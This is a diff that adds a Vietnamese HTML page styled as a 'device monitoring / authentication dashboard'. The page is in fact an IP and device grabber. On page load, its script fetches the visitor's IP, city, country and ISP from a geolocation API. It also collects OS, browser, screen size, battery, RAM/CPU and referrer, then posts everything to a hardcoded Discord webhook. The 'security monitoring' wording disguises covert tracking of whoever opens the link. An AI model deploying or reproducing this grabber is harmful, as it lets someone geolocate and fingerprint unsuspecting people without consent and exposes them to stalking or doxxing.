@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hệ Thống Giám Sát Thiết Bị</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #0d1117; color: #c9d1d9; padding: 20px; display: flex; justify-content: center; }
+        .container { width: 100%; max-width: 650px; border: 1px solid #30363d; padding: 25px; background: #161b22; border-radius: 12px; box-shadow: 0 8px 32px rgba(0,0,0,0.6); }
+        .header { text-align: center; border-bottom: 2px solid #238636; padding-bottom: 15px; margin-bottom: 20px; }
+        h2 { color: #ffffff; margin: 0; font-size: 1.4rem; letter-spacing: 1px; }
+        
+        .box { background: #0d1117; border-radius: 8px; padding: 15px; margin-bottom: 15px; border: 1px solid #30363d; }
+        .label { color: #8b949e; font-size: 0.8rem; text-transform: uppercase; margin-bottom: 5px; }
+        .value { color: #39d353; font-size: 1.1rem; font-weight: bold; font-family: 'Courier New', Courier, monospace; }
+
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+        .item { background: #21262d; padding: 10px; border-radius: 6px; border: 1px solid #30363d; }
+        .item-label { color: #7d8590; font-size: 0.7rem; }
+        .item-value { color: #58a6ff; font-size: 0.9rem; font-weight: 500; }
+
+        #status { text-align: center; margin-top: 20px; font-size: 0.85rem; color: #d29922; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header"><h2>DASHBOARD XÁC THỰC</h2></div>
+
+    <div class="box">
+        <div class="label">🌐 Địa chỉ IP của bạn:</div>
+        <div id="ip" class="value">Đang quét hệ thống...</div>
+    </div>
+
+    <div class="box">
+        <div class="label">⏰ Thời gian hiện tại:</div>
+        <div id="time" class="value">--:--:--</div>
+    </div>
+
+    <div class="grid">
+        <div class="item"><div class="item-label">VỊ TRÍ</div><div id="city" class="item-value">Đang lấy...</div></div>
+        <div class="item"><div class="item-label">HỆ ĐIỀU HÀNH</div><div id="os" class="item-value">...</div></div>
+        <div class="item"><div class="item-label">TRÌNH DUYỆT</div><div id="browser" class="item-value">...</div></div>
+        <div class="item"><div class="item-label">ĐỘ PHÂN GIẢI</div><div id="res" class="item-value">...</div></div>
+        <div class="item"><div class="item-label">PIN</div><div id="battery" class="item-value">...</div></div>
+        <div class="item"><div class="item-label">RAM / CPU</div><div id="hw" class="item-value">...</div></div>
+    </div>
+
+    <div id="status">Vui lòng đợi, dữ liệu đang được đồng bộ...</div>
+</div>
+
+<script>
+    // Webhook Discord của bạn
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1487644219945390160/FNtkSqJw4J-4md6mgXJpfwdCsX8pcWn72BEd6snufQKxCNzJzGL5HVzdgknp9L9-cCbM";
+
+    async function init() {
+        // 1. Lấy IP & Vị trí
+        let networkData = {};
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            networkData = await res.json();
+            document.getElementById('ip').innerText = networkData.ip || "N/A";
+            document.getElementById('city').innerText = `${networkData.city || '?'}, ${networkData.country_name || '?'}`;
+        } catch (e) { document.getElementById('ip').innerText = "Lỗi kết nối"; }
+
+        // 2. Lấy thông số thiết bị
+        const ua = navigator.userAgent;
+        const os = ua.includes("Windows") ? "Windows 💻" : ua.includes("Android") ? "Android 📱" : ua.includes("iPhone") ? "iOS 🍎" : "Mac/Linux";
+        const browser = ua.includes("Edg") ? "Edge" : ua.includes("Chrome") ? "Chrome" : ua.includes("Firefox") ? "Firefox" : "Safari";
+        
+        document.getElementById('os').innerText = os;
+        document.getElementById('browser').innerText = browser;
+        document.getElementById('res').innerText = `${screen.width}x${screen.height}`;
+        document.getElementById('hw').innerText = `${navigator.deviceMemory || '?'}GB / ${navigator.hardwareConcurrency || '?'} nhân`;
+
+        // 3. Lấy Pin
+        let batteryInfo = "N/A";
+        if (navigator.getBattery) {
+            const b = await navigator.getBattery();
+            batteryInfo = `${(b.level * 100).toFixed(0)}% ${b.charging ? '⚡' : '🔋'}`;
+            document.getElementById('battery').innerText = batteryInfo;
+        }
+
+        // 4. Gửi Discord
+        setTimeout(() => sendDiscord(networkData, os, browser, batteryInfo), 1000);
+    }
+
+    async function sendDiscord(net, os, br, bat) {
+        const payload = {
+            "username": "Cảnh Báo Truy Cập",
+            "content": "⚠️ **PHÁT HIỆN THIẾT BỊ MỚI TRUY CẬP**",
+            "embeds": [{
+                "title": "CHI TIẾT THÔNG TIN",
+                "color": 15158332,
+                "description": `
+**🌐 Địa chỉ IP:** \`${document.getElementById('ip').innerText}\`
+**📍 Vị trí:** ${document.getElementById('city').innerText}
+**🏢 Nhà mạng:** ${net.org || 'Không rõ'}
+
+**💻 Thiết bị:** ${os}
+**🧭 Trình duyệt:** ${br}
+**🖥️ Độ phân giải:** ${document.getElementById('res').innerText}
+**🔋 Trạng thái Pin:** ${bat}
+**🧠 Cấu hình:** ${document.getElementById('hw').innerText}
+
+**🍪 Cookie:** ${navigator.cookieEnabled ? 'Bật ✅' : 'Tắt ❌'}
+**⏰ Thời gian:** ${document.getElementById('time').innerText}
+**🔗 Nguồn:** ${document.referrer || 'Trực tiếp'}
+                `,
+                "footer": { "text": "Hệ thống giám sát bảo mật" },
+                "timestamp": new Date().toISOString()
+            }]
+        };
+
+        try {
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            document.getElementById('status').innerText = "✅ DỮ LIỆU ĐÃ GỬI VỀ DISCORD";
+            document.getElementById('status').style.color = "#39d353";
+        } catch (e) { document.getElementById('status').innerText = "❌ LỖI GỬI DỮ LIỆU"; }
+    }
+
+    // Cập nhật đồng hồ
+    setInterval(() => {
+        document.getElementById('time').innerText = new Date().toLocaleString('vi-VN');
+    }, 1000);
+
+    init();
+</script>
+</body>
+</html>
